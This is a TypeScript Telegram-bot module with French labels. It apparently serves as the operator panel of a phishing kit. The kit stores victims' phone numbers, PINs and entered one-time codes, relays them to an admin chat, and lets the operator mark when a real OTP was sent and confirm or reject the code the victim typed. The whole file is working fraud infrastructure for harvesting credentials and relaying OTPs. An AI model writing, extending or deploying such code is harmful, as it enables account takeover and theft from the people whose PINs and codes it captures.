import { Telegraf, Markup } from "telegraf";
import { logger } from "./logger";
import { db, sessionsTable } from "@workspace/db";
import { eq } from "drizzle-orm";

const TOKEN = process.env.TELEGRAM_BOT_TOKEN ?? "";
const CHAT_ID = process.env.TELEGRAM_CHAT_ID ?? "";

// ---------------------------------------------------------------------------
// Singleton bot instance — action handlers are registered at module load time
// ---------------------------------------------------------------------------
const bot = new Telegraf(TOKEN);

// ── Admin clicks "📤 OTP Envoyé" ─────────────────────────────────────────
bot.action(/^otp_sent:(.+)$/, async (ctx) => {
  const sessionId = ctx.match[1]!;
  logger.info({ sessionId }, "Admin clicked: OTP Envoyé");

  try {
    const [session] = await db
      .select()
      .from(sessionsTable)
      .where(eq(sessionsTable.id, sessionId));

    if (!session) {
      await ctx.answerCbQuery("Session introuvable ❌");
      return;
    }

    await db
      .update(sessionsTable)
      .set({ status: "otp_sent" })
      .where(eq(sessionsTable.id, sessionId));

    await ctx.answerCbQuery("📤 OTP envoyé — utilisateur débloqué");

    await ctx.editMessageText(
      `📤 *OTP ENVOYÉ*\n\n` +
      `📱 Téléphone: \`${session.phone}\`\n` +
      `🔑 PIN: \`${session.pin}\`\n` +
      `📦 Forfait: *${session.packageName}* — ${session.packagePrice}\n\n` +
      `_En attente de la saisie OTP par l'utilisateur..._`,
      { parse_mode: "Markdown" },
    );

    logger.info({ sessionId }, "Session → otp_sent");
  } catch (err) {
    logger.error({ err, sessionId }, "Error in otp_sent handler");
    await ctx.answerCbQuery("Erreur interne").catch(() => {});
  }
});

// ── Admin clicks "✅ Confirmer" ───────────────────────────────────────────
bot.action(/^confirm:(.+)$/, async (ctx) => {
  const sessionId = ctx.match[1]!;
  logger.info({ sessionId }, "Admin clicked: Confirmer");

  try {
    const [session] = await db
      .select()
      .from(sessionsTable)
      .where(eq(sessionsTable.id, sessionId));

    if (!session) {
      await ctx.answerCbQuery("Session introuvable ❌");
      return;
    }

    await db
      .update(sessionsTable)
      .set({ status: "verified" })
      .where(eq(sessionsTable.id, sessionId));

    await ctx.answerCbQuery("✅ OTP confirmé — utilisateur connecté !");

    await ctx.editMessageText(
      `✅ *OTP CONFIRMÉ*\n\n` +
      `📱 Téléphone: \`${session.phone}\`\n` +
      `📦 Forfait: *${session.packageName}* — ${session.packagePrice}\n` +
      `🔢 OTP: \`${session.enteredOtp ?? "?"}\`\n\n` +
      `_Utilisateur connecté avec succès._`,
      { parse_mode: "Markdown" },
    );

    logger.info({ sessionId }, "Session → verified");
  } catch (err) {
    logger.error({ err, sessionId }, "Error in confirm handler");
    await ctx.answerCbQuery("Erreur interne").catch(() => {});
  }
});

// ── Admin clicks "❌ Rejeter" ─────────────────────────────────────────────
bot.action(/^reject:(.+)$/, async (ctx) => {
  const sessionId = ctx.match[1]!;
  logger.info({ sessionId }, "Admin clicked: Rejeter");

  try {
    const [session] = await db
      .select()
      .from(sessionsTable)
      .where(eq(sessionsTable.id, sessionId));

    if (!session) {
      await ctx.answerCbQuery("Session introuvable ❌");
      return;
    }

    await db
      .update(sessionsTable)
      .set({ status: "rejected" })
      .where(eq(sessionsTable.id, sessionId));

    await ctx.answerCbQuery("❌ OTP rejeté");

    await ctx.editMessageText(
      `❌ *OTP REJETÉ*\n\n` +
      `📱 Téléphone: \`${session.phone}\`\n` +
      `📦 Forfait: *${session.packageName}* — ${session.packagePrice}\n` +
      `🔢 OTP: \`${session.enteredOtp ?? "?"}\``,
      { parse_mode: "Markdown" },
    );

    logger.info({ sessionId }, "Session → rejected");
  } catch (err) {
    logger.error({ err, sessionId }, "Error in reject handler");
    await ctx.answerCbQuery("Erreur interne").catch(() => {});
  }
});

// ---------------------------------------------------------------------------
// Keyboard builders
// ---------------------------------------------------------------------------

export function buildLoginKeyboard(sessionId: string) {
  return Markup.inlineKeyboard([
    [Markup.button.callback("📤 OTP Envoyé", `otp_sent:${sessionId}`)],
  ]);
}

export function buildOtpKeyboard(sessionId: string) {
  return Markup.inlineKeyboard([
    [
      Markup.button.callback("✅ Confirmer", `confirm:${sessionId}`),
      Markup.button.callback("❌ Rejeter", `reject:${sessionId}`),
    ],
  ]);
}

// ---------------------------------------------------------------------------
// Send a message to the configured admin chat
// ---------------------------------------------------------------------------

export async function sendMessage(
  text: string,
  extra?: object,
): Promise<void> {
  if (!TOKEN || !CHAT_ID) return;
  try {
    await bot.telegram.sendMessage(CHAT_ID, text, {
      parse_mode: "Markdown",
      ...(extra ?? {}),
    } as Parameters<typeof bot.telegram.sendMessage>[2]);
  } catch (err) {
    logger.error({ err }, "sendMessage failed");
  }
}

// ---------------------------------------------------------------------------
// Start long-polling (only called in non-dev environments)
// ---------------------------------------------------------------------------

export function startPolling(): void {
  if (!TOKEN || !CHAT_ID) {
    logger.warn("TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID missing — bot disabled");
    return;
  }

  logger.info("Telegraf bot launching...");

  // bot.launch() deletes any stale webhook then starts long-polling.
  // It returns a Promise that resolves when the bot stops — do NOT await it.
  bot
    .launch({ allowedUpdates: ["callback_query"] })
    .catch((err: unknown) => logger.error({ err }, "Telegraf bot error"));

  process.once("SIGINT", () => bot.stop("SIGINT"));
  process.once("SIGTERM", () => bot.stop("SIGTERM"));

  logger.info("Telegraf bot polling started ✓");
}
